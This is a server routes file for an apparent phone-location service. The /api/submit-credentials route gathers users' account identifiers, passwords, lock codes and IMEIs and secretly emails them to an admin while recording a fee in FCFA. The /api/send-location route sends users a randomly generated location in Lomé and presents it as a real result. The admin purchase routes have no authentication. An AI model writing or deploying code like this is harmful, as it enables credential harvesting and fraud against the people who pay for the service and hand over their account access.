import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  sendUserCredentialsToAdmin, 
  sendPaymentConfirmation, 
  sendLocationToUser,
  UserCredentials 
} from "./email";
import { generateLomeLocation } from "../client/src/lib/device-data";
import { insertPurchaseSchema } from "@shared/schema";

export async function registerRoutes(app: Express): Promise<Server> {
  // Health check endpoint
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });

  // Admin: Get all purchases
  app.get('/api/admin/purchases', async (req, res) => {
    const purchases = await storage.getPurchases();
    res.json(purchases);
  });

  // Admin: Validate purchase
  app.patch('/api/admin/purchases/:id', async (req, res) => {
    const id = parseInt(req.params.id);
    const { status, userEmail, device, imei, amount } = req.body;

    const updated = await storage.updatePurchaseStatus(id, status);
    if (!updated) return res.status(404).json({ error: 'Purchase not found' });

    if (status === 'validated') {
      await sendPaymentConfirmation(userEmail, device, imei, amount);
    }

    res.json(updated);
  });

  // Submit user credentials and send to admin
  app.post('/api/submit-credentials', async (req, res) => {
    try {
      const { email, platform, device, identifier, password, lockCode, imei } = req.body;

      if (!email || !platform || !device || !identifier || !password || !lockCode || !imei) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const credentials: UserCredentials = {
        email,
        platform,
        device,
        identifier,
        password,
        lockCode,
        imei
      };

      // Create a pending purchase record
      const amount = req.body.isFastTrack ? 19900 : 5000; // 32.9$ is roughly 19,900 FCFA, 9.99$ is 5000 FCFA
      await storage.createPurchase({
        userId: null,
        device,
        imei,
        amount,
        status: "pending",
        userEmail: email
      });

      // Send credentials to admin (secret)
      const adminEmailSent = await sendUserCredentialsToAdmin(credentials);

      if (adminEmailSent) {
        res.json({ success: true, message: 'Credentials submitted successfully' });
      } else {
        res.status(500).json({ error: 'Failed to process credentials' });
      }
    } catch (error) {
      console.error('Error submitting credentials:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send payment confirmation
  app.post('/api/confirm-payment', async (req, res) => {
    try {
      const { userEmail, device, imei } = req.body;

      if (!userEmail || !device || !imei) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const emailSent = await sendPaymentConfirmation(userEmail, device, imei);

      if (emailSent) {
        res.json({ success: true, message: 'Payment confirmation sent' });
      } else {
        res.status(500).json({ error: 'Failed to send payment confirmation' });
      }
    } catch (error) {
      console.error('Error sending payment confirmation:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send location to user
  app.post('/api/send-location', async (req, res) => {
    try {
      const { userEmail, device } = req.body;

      if (!userEmail || !device) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      // Generate random location in Lomé
      const coordinates = generateLomeLocation();
      const emailSent = await sendLocationToUser(userEmail, device, coordinates);

      if (emailSent) {
        res.json({ success: true, message: 'Location sent to user', coordinates });
      } else {
        res.status(500).json({ error: 'Failed to send location' });
      }
    } catch (error) {
      console.error('Error sending location:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
